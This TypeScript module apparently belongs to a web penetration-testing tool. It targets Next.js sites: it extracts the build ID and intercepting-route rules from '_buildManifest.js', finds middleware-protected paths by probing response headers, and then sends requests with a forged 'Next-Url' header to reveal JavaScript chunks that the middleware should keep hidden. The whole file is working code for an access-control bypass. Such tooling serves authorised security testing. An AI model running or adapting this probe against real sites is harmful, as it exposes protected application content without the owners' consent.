import vm from "vm";
import * as parser from "@babel/parser";
import traverse from "@babel/traverse";
import rawRequest, { type RawResponse } from "../../exploit/utility/rawRequest.js";
import { runWithConcurrency } from "../../utility/concurrency.js";
import { printMsg, MSG } from "../../utility/printMsg.js";
import { extractChunkPathsFromFlightBody } from "./next_routerStateForge.js";

const REQUEST_TIMEOUT_MS = 15000;

/** ponytail: fixed cap on (protected path × public page) pairs in blind mode; make it a flag if real targets need more. */
const MAX_BLIND_PAIRS = 200;

/** An intercepting-route rewrite from `_buildManifest.js`'s `__rewrites.beforeFiles`. */
export interface InterceptRule {
    source: string;
    destination: string;
    /** Value of the rule's `has: [{ type: "header", key: "next-url", value }]` guard. */
    nextUrlRegex: string;
}

/**
 * Reads the Next.js buildId from landing-page HTML (or any text holding a manifest URL):
 * a `/_next/static/<id>/_buildManifest.js` reference, the Flight root row's `"b":"<id>"`
 * (15/16, often escaped as `\"b\":\"<id>\"` inside `__next_f.push`), or `"buildId":"<id>"` (14).
 * Only the root row (`0:{"P":null,"b":…}` / `0:{"b":…}`) takes an id of any length, so a custom
 * `generateBuildId` such as `abc` is found; a `"b"` key anywhere else needs 4+ characters.
 */
export const extractBuildId = (text: string): string | null => {
    const patterns = [
        /\/_next\/static\/([A-Za-z0-9_-]+)\/_(?:buildManifest|ssgManifest)\.js/,
        /\b0:\{(?:\\?"P\\?":null,)?\\?"b\\?":\\?"([A-Za-z0-9_-]+)\\?"/,
        /\\?"b\\?"\s*:\s*\\?"([A-Za-z0-9_-]{4,})\\?"/,
        /"buildId"\s*:\s*"([A-Za-z0-9_-]+)"/,
    ];
    for (const re of patterns) {
        const m = text.match(re);
        if (m) return m[1];
    }
    return null;
};

const propKey = (p: any): string | undefined =>
    p.key?.type === "Identifier" ? p.key.name : p.key?.type === "StringLiteral" ? p.key.value : undefined;

/**
 * The string a manifest value evaluates to: a literal, or an identifier bound to one. Next.js
 * hoists repeated strings into the parameters of the manifest's IIFE
 * (`function(e,s){return {...}}("/x","/y")`), or into a constant.
 */
const stringValue = (valuePath: any): string | undefined => {
    const node = valuePath?.node;
    if (node?.type === "StringLiteral") return node.value;
    if (node?.type !== "Identifier") return undefined;
    const binding = valuePath.scope.getBinding(node.name);
    if (!binding) return undefined;
    if (binding.kind === "param") {
        const fn = binding.scope.path;
        const idx = fn.node.params?.indexOf(binding.identifier) ?? -1;
        const call = fn.parentPath;
        if (idx < 0 || call?.node?.type !== "CallExpression" || call.node.callee !== fn.node) return undefined;
        const arg = call.node.arguments[idx];
        return arg?.type === "StringLiteral" ? arg.value : undefined;
    }
    const init = binding.path.node?.init;
    return binding.constant && init?.type === "StringLiteral" ? init.value : undefined;
};

/** The path of `objPath`'s `key` property value. */
const propValue = (objPath: any, key: string): any =>
    objPath
        .get("properties")
        .find((p: any) => p.node.type === "ObjectProperty" && propKey(p.node) === key)
        ?.get("value");

const propString = (objPath: any, key: string): string | undefined => stringValue(propValue(objPath, key));

/**
 * Collects intercepting-route rewrites from `_buildManifest.js`: any object literal with string
 * `source`/`destination` and a `has` array holding a `next-url` header condition. Covers 14's
 * minified object form and 16's pretty-printed JSON (keys as string literals). `null` when the
 * manifest doesn't parse cleanly (for example a truncated download), so the caller can fall back
 * to probing without rules instead of trusting an empty list.
 */
export const parseInterceptRules = (manifestJs: string): InterceptRule[] | null => {
    const rules: InterceptRule[] = [];
    let ast;
    try {
        ast = parser.parse(manifestJs, { sourceType: "unambiguous", errorRecovery: true });
    } catch {
        return null;
    }
    if ((ast as any).errors?.length) return null;
    traverse(ast, {
        ObjectExpression(path) {
            const source = propString(path, "source");
            const destination = propString(path, "destination");
            if (!source || !destination) return;
            const has = propValue(path, "has");
            if (has?.node?.type !== "ArrayExpression") return;
            for (const cond of has.get("elements")) {
                if (cond?.node?.type !== "ObjectExpression") continue;
                // only a header condition is what Next-Url satisfies (not a cookie or query named next-url)
                if (propString(cond, "type") !== "header") continue;
                const key = propString(cond, "key");
                const value = propString(cond, "value");
                if (key?.toLowerCase() === "next-url" && value) {
                    rules.push({ source, destination, nextUrlRegex: value });
                }
            }
        },
    });
    return rules;
};

/** Interception markers Next.js puts on the intercepting segment: `(.)`, `(..)`, `(..)(..)`, `(...)`. */
const INTERCEPTION_MARKER = /^\((?:\.{1,3}|\.\.\)\(\.\.)\)/;

/** Fills every path-to-regexp param (`:id`, `:slug*`, `:id(\\d+)`) with a literal `1`. */
const fillParams = (p: string): string => p.replace(/:[A-Za-z0-9_]+(?:\([^)]*\))?[*+?]?/g, "1");

/** Deadline for one guard match: the regex comes from the target's manifest, so it can backtrack forever. */
const GUARD_MATCH_TIMEOUT_MS = 100;
const guardContext = vm.createContext({ src: "", input: "" });
const guardScript = new vm.Script("new RegExp(src).test(input)");

/**
 * True when `nextUrl` satisfies a rule's `next-url` guard (Next.js anchors it as `^…$`). The match
 * runs in a vm context with a timeout, which interrupts catastrophic backtracking; a guard that
 * times out or doesn't compile doesn't match.
 */
export const matchesNextUrl = (nextUrlRegex: string, nextUrl: string): boolean => {
    guardContext.src = `^${nextUrlRegex}$`;
    guardContext.input = nextUrl;
    try {
        return guardScript.runInContext(guardContext, { timeout: GUARD_MATCH_TIMEOUT_MS }) === true;
    } catch {
        return false;
    }
};

/**
 * Turns an intercept rule into a concrete request: `sourcePath` is the public route to fetch,
 * `parentPath` is the intercepting route's parent (the `Next-Url` value). `null` if the
 * destination has no interception marker or the derived parent doesn't satisfy the guard.
 */
export const interceptRuleToRequest = (rule: InterceptRule): { sourcePath: string; parentPath: string } | null => {
    const segments = rule.destination.split("/");
    const markerIdx = segments.findIndex((s) => INTERCEPTION_MARKER.test(s));
    if (markerIdx < 1) return null;
    const parentPath = fillParams(segments.slice(0, markerIdx).join("/")) || "/";
    if (!matchesNextUrl(rule.nextUrlRegex, parentPath)) return null;
    return { sourcePath: fillParams(rule.source), parentPath };
};

/**
 * Response headers that show a request went through Next.js middleware/proxy: any
 * `x-middleware-*` (rewrite/redirect/next/set-cookie), plus the data-request forms
 * `x-nextjs-redirect` / `x-nextjs-rewrite` returned when `x-nextjs-data: 1` is sent.
 */
export const detectMiddlewareHeaders = (headers: Record<string, string>): string[] =>
    Object.keys(headers)
        .map((h) => h.toLowerCase())
        .filter((h) => h.startsWith("x-middleware-") || h === "x-nextjs-redirect" || h === "x-nextjs-rewrite");

export interface InterceptRouteNextUrlResult {
    /** Public source URLs whose response, with `Next-Url` set to a middleware-protected path, carried new chunks. */
    revealedUrls: string[];
    /** Redirecting paths and the middleware-revealing headers seen on them. */
    middlewareSignals: Record<string, string[]>;
    /** New downloadable chunk URLs from those responses. */
    newJsUrls: string[];
}

/** Chunk paths in a path's plain 2xx HTML response; `null` when it didn't answer 2xx HTML. */
type Baseline = Set<string> | null;

/**
 * Pages-style data route for a path: `/_next/data/<buildId>/admin.json`, `/` → `index.json`. With a
 * `basePath` (`/app`), Next.js serves it at `/app/_next/data/<buildId>/admin.json` for `/app/admin`.
 */
export const dataRoutePath = (buildId: string, path: string, basePath = ""): string => {
    const inApp = basePath && (path === basePath || path.startsWith(`${basePath}/`));
    const rest = inApp ? path.slice(basePath.length) || "/" : path;
    return `${basePath}/_next/data/${buildId}${rest === "/" ? "/index" : rest.replace(/\/$/, "")}.json`;
};

/**
 * What chunk paths resolve against: everything before `_next/static/` in an already-downloaded
 * chunk URL, which keeps a CDN `assetPrefix` or a deployment `basePath`; else the origin root.
 */
export const assetBase = (knownUrls: string[], origin: string): string => {
    const u = knownUrls.find((x) => x.includes("/_next/static/"));
    return u ? u.slice(0, u.indexOf("/_next/static/") + 1) : `${origin}/`;
};

/** The app's `basePath` (`""` or `/app`): the asset base's path, when the assets are on the target origin. */
export const basePathOf = (base: string, origin: string): string => {
    const b = new URL(base);
    return b.origin === origin ? b.pathname.replace(/\/$/, "") : "";
};

/** A chunk path from a Flight/HTML body (`_next/static/chunks/x.js` or `static/chunks/x.js`) as a URL under `base`. */
export const chunkUrl = (chunkPath: string, base: string): string =>
    new URL(chunkPath.startsWith("_next/") ? chunkPath : `_next/${chunkPath}`, base).toString();

const isHtml = (r: RawResponse): boolean => (r.headers["content-type"] ?? "").includes("text/html");

/** Finds `_buildManifest.js` among known URLs, else synthesizes it from the landing page's buildId. */
const findBuildManifest = async (
    origin: string,
    knownUrls: string[],
    base: string
): Promise<{ manifestUrl: string; buildId: string } | null> => {
    const known = knownUrls.find((u) => u.endsWith("/_buildManifest.js"));
    const knownId = known ? extractBuildId(known) : null;
    if (known && knownId) return { manifestUrl: known, buildId: knownId };

    const landing = await rawRequest(origin + "/", { timeout: REQUEST_TIMEOUT_MS });
    const buildId = landing ? extractBuildId(landing.body) : null;
    if (!buildId) return null;
    return { manifestUrl: `${base}_next/static/${buildId}/_buildManifest.js`, buildId };
};

/**
 * Intercepting-route lookup. Next.js serves an intercepting route defined under a
 * segment (e.g. `app/admin/@modal/(..)pub/[id]`) through its public source route (`/pub/1`)
 * whenever the request's `Next-Url` header matches the segment — and the middleware matcher is
 * evaluated against the public URL, so middleware guarding `/admin` never runs for it.
 *
 * 1. Intercept rules come from `_buildManifest.js` `__rewrites.beforeFiles` (found or synthesized
 *    from the buildId).
 * 2. Rule parents plus the crawl/strings candidates get a plain GET. A 3xx path is re-requested
 *    with `x-nextjs-data: 1` and as its `/_next/data/<buildId>/<path>.json` data route, where
 *    middleware reports itself in headers (`detectMiddlewareHeaders`). The data-route form is
 *    what still answers with `x-nextjs-redirect` on App-Router-only 16.x builds.
 * 3. Only redirecting paths with a middleware signal count as protected (a layout `redirect()`
 *    still runs on the intercept, so it isn't worth a request). For each rule whose guard matches
 *    a protected path, the public source is fetched with `Next-Url: <parent>`; chunk paths absent
 *    from the plain response are new. Without a manifest, a capped blind pass tries every
 *    (protected path, public page) pair instead.
 */
const next_interceptRouteNextUrl = async (
    origin: string,
    knownUrls: string[],
    candidateUrls: string[],
    threads: number
): Promise<InterceptRouteNextUrlResult> => {
    const middlewareSignals: Record<string, string[]> = {};
    const revealedUrls = new Set<string>();
    const newJsUrls = new Set<string>();

    const base = assetBase(knownUrls, origin);
    const basePath = basePathOf(base, origin);
    let rules: { sourcePath: string; parentPath: string; nextUrlRegex: string }[] | null = null;
    const found = await findBuildManifest(origin, knownUrls, base);
    if (found) {
        const manifest = await rawRequest(found.manifestUrl, { timeout: REQUEST_TIMEOUT_MS });
        // A catch-all route can answer 200 HTML here, and a download can be cut short: only a
        // manifest that parses rules out blind mode.
        const parsed =
            manifest && manifest.status === 200 && manifest.body.includes("__BUILD_MANIFEST")
                ? parseInterceptRules(manifest.body)
                : null;
        if (parsed) {
            rules = [];
            for (const rule of parsed) {
                const req = interceptRuleToRequest(rule);
                if (req) rules.push({ ...req, nextUrlRegex: rule.nextUrlRegex });
            }
            if (rules.length > 0) printMsg(MSG.Info, `[i] ${rules.length} intercepting route(s) in _buildManifest.js`);
        }
    }

    // Same-origin paths only: Next-Url is resolved against the target, and blind mode needs paths.
    const paths = new Set<string>();
    for (const r of rules ?? []) paths.add(r.parentPath).add(r.sourcePath);
    for (const u of candidateUrls) {
        try {
            const parsed = new URL(u);
            if (parsed.origin === origin) paths.add(parsed.pathname);
        } catch {
            // unresolvable candidate
        }
    }

    const baselines = new Map<string, Baseline>();
    await runWithConcurrency([...paths], threads, async (p) => {
        const plain = await rawRequest(origin + p, { timeout: REQUEST_TIMEOUT_MS });
        if (!plain) return;
        const ok = plain.status >= 200 && plain.status < 300 && isHtml(plain);
        baselines.set(
            p,
            ok ? new Set(extractChunkPathsFromFlightBody(plain.body).map((c) => chunkUrl(c, base))) : null
        );
        if (plain.status < 300 || plain.status >= 400) return;

        const probeUrls = [origin + p, ...(found ? [origin + dataRoutePath(found.buildId, p, basePath)] : [])];
        const signals = new Set(detectMiddlewareHeaders(plain.headers));
        for (const u of probeUrls) {
            const data = await rawRequest(u, { timeout: REQUEST_TIMEOUT_MS, headers: { "x-nextjs-data": "1" } });
            for (const h of detectMiddlewareHeaders(data?.headers ?? {})) signals.add(h);
        }
        if (signals.size > 0) {
            middlewareSignals[p] = [...signals];
            printMsg(MSG.Info, `[i] Middleware response headers on ${p}: ${[...signals].join(", ")}`);
        }
    });

    const protectedPaths = Object.keys(middlewareSignals);
    if (protectedPaths.length === 0) return { revealedUrls: [], middlewareSignals, newJsUrls: [] };

    // (public source path, Next-Url) pairs to try.
    const attempts: { sourcePath: string; nextUrl: string }[] = [];
    if (rules) {
        const seen = new Set<string>();
        const add = (sourcePath: string, nextUrl: string) => {
            const k = `${sourcePath}\n${nextUrl}`;
            if (seen.has(k)) return;
            seen.add(k);
            attempts.push({ sourcePath, nextUrl });
        };
        for (const r of rules) {
            const matching = protectedPaths.filter((p) => matchesNextUrl(r.nextUrlRegex, p));
            if (matching.length === 0) continue;
            // The synthesized parent (`/org/1`), and each real protected path the guard matches
            // (`/org/acme`): a dynamic segment can render different content per value.
            add(r.sourcePath, r.parentPath);
            for (const p of matching) add(r.sourcePath, p);
        }
    } else {
        const publicPaths = [...baselines].filter(([, b]) => b).map(([p]) => p);
        outer: for (const nextUrl of protectedPaths) {
            for (const sourcePath of publicPaths) {
                if (attempts.length >= MAX_BLIND_PAIRS) break outer;
                attempts.push({ sourcePath, nextUrl });
            }
        }
    }

    await runWithConcurrency(attempts, threads, async ({ sourcePath, nextUrl }) => {
        const url = origin + sourcePath;
        const res = await rawRequest(url, { timeout: REQUEST_TIMEOUT_MS, headers: { "Next-Url": nextUrl } });
        if (!res || res.status < 200 || res.status >= 300) return;
        const baseline = baselines.get(sourcePath) ?? new Set<string>();
        // compared as URLs: `_next/static/chunks/x.js` and `static/chunks/x.js` are the same chunk
        const fresh = [...new Set(extractChunkPathsFromFlightBody(res.body).map((c) => chunkUrl(c, base)))].filter(
            (c) => !baseline.has(c)
        );
        if (fresh.length === 0) return;
        printMsg(
            MSG.Run,
            `[✓] Intercept-route request (Next-Url: ${nextUrl}) revealed content: ${url} (${fresh.length} new chunk(s))`
        );
        revealedUrls.add(url);
        for (const c of fresh) newJsUrls.add(c);
    });

    return { revealedUrls: [...revealedUrls], middlewareSignals, newJsUrls: [...newJsUrls] };
};

export default next_interceptRouteNextUrl;
